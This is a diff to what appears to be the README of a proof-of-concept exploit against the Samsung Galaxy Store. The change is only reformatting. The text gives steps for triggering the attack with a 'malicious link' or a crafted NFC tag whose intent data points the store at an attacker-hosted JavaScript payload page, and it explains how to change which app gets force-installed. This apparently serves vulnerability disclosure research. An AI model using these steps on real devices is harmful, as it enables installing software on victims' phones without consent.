@@ -25,7 +25,7 @@ Then do one of the following:
 
 * Browse to `http://home.yay` and click on the "malicious link"
 * Create a NFC tag with the following properties and scan it:
-** Data type: `application/com.sec.android.app.samsungapps.detail`
-** Data payload: `http://apps.samsung.com/appquery/EditorialPage.as?url=http://img.samsungapps.com/yaypayloadyay.html`
+    - Data type: `application/com.sec.android.app.samsungapps.detail`
+    - Data payload: `http://apps.samsung.com/appquery/EditorialPage.as?url=http://img.samsungapps.com/yaypayloadyay.html`
 
 If you want to change the app that gets installed, open the file `/html/yaypayloadyay.html` and modify the JavaScript so that `com.weather.samsung` is changed to a different package name that is available on the Galaxy Store.
